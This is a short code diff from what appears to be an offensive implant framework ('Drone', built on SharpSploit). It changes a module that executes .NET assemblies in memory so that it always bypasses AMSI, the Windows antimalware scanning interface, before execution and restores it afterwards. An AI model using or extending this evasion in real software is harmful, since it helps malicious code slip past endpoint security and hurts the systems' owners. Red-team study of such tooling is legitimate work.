@@ -4,7 +4,6 @@ using System.Text;
 using System.Threading;
 
 using Drone.Models;
-using Drone.SharpSploit.Evasion;
 
 namespace Drone.Modules
 {
@@ -37,13 +36,11 @@ namespace Drone.Modules
             Console.SetOut(stdOutWriter);
             Console.SetError(stdErrWriter);
             
-            var bypassAmsi = Config.GetConfig<bool>("BypassAmsi");
-            var amsi = new Amsi();
-            if (bypassAmsi) amsi.Patch();
+            Evasion.BypassAmsi();
                 
             SharpSploit.Execution.Assembly.Execute(asm, task.Arguments);
             
-            if (bypassAmsi) amsi.Restore();
+            Evasion.RestoreAmsi();
                 
             Console.Out.Flush();
             Console.Error.Flush();
